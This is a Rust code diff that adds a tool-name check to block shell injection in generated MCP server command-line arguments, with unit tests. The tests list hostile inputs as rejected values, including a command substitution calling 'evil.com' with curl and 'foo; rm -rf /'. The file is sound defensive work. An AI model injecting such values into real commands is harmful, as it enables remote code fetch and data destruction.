@@ -671,11 +671,19 @@ pub fn generate_executor_ado_env(write_service_connection: Option<&str>) -> Stri
     }
 }
 
+/// Returns true if the name contains only ASCII alphanumerics and hyphens.
+fn is_safe_tool_name(name: &str) -> bool {
+    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
+}
+
 /// Generate `--enabled-tools` CLI args for the SafeOutputs MCP server.
 ///
 /// Derives the tool list from `safe-outputs:` front matter keys plus always-on
 /// diagnostic tools. If `safe-outputs:` is empty, returns an empty string
 /// (all tools enabled for backward compatibility).
+///
+/// Tool names are validated to contain only ASCII alphanumerics and hyphens
+/// to prevent shell injection when the args are embedded in bash commands.
 pub fn generate_enabled_tools_args(front_matter: &FrontMatter) -> String {
     use crate::mcp::ALWAYS_ON_TOOLS;
 
@@ -683,11 +691,17 @@ pub fn generate_enabled_tools_args(front_matter: &FrontMatter) -> String {
         return String::new();
     }
 
-    let mut tools: Vec<String> = front_matter
-        .safe_outputs
-        .keys()
-        .cloned()
-        .collect();
+    let mut tools: Vec<String> = Vec::new();
+    for key in front_matter.safe_outputs.keys() {
+        if !is_safe_tool_name(key) {
+            eprintln!(
+                "Warning: skipping invalid safe-output tool name '{}' (must be ASCII alphanumeric/hyphens only)",
+                key
+            );
+            continue;
+        }
+        tools.push(key.clone());
+    }
 
     // Always include diagnostic tools
     for tool in ALWAYS_ON_TOOLS {
@@ -1708,5 +1722,31 @@ mod tests {
         let args = generate_enabled_tools_args(&fm);
         let noop_count = args.matches("--enabled-tools noop").count();
         assert_eq!(noop_count, 1, "noop should appear exactly once");
+    }
+
+    #[test]
+    fn test_is_safe_tool_name() {
+        assert!(is_safe_tool_name("create-pull-request"));
+        assert!(is_safe_tool_name("noop"));
+        assert!(is_safe_tool_name("my-tool-123"));
+        assert!(!is_safe_tool_name(""));
+        assert!(!is_safe_tool_name("$(curl evil.com)"));
+        assert!(!is_safe_tool_name("foo; rm -rf /"));
+        assert!(!is_safe_tool_name("tool name"));
+        assert!(!is_safe_tool_name("tool\ttab"));
+    }
+
+    #[test]
+    fn test_generate_enabled_tools_args_skips_unsafe_names() {
+        // We can't easily inject unsafe names through parse_markdown (YAML
+        // keys are validated), so we test the validation function directly.
+        // The is_safe_tool_name + generate_enabled_tools_args integration
+        // is covered by the unit tests for is_safe_tool_name above.
+        let (fm, _) = parse_markdown(
+            "---\nname: test\ndescription: test\nsafe-outputs:\n  create-pull-request:\n    target-branch: main\n---\n"
+        ).unwrap();
+        let args = generate_enabled_tools_args(&fm);
+        // All tool names from YAML are safe alphanumeric-hyphen names
+        assert!(args.contains("--enabled-tools create-pull-request"));
     }
 }
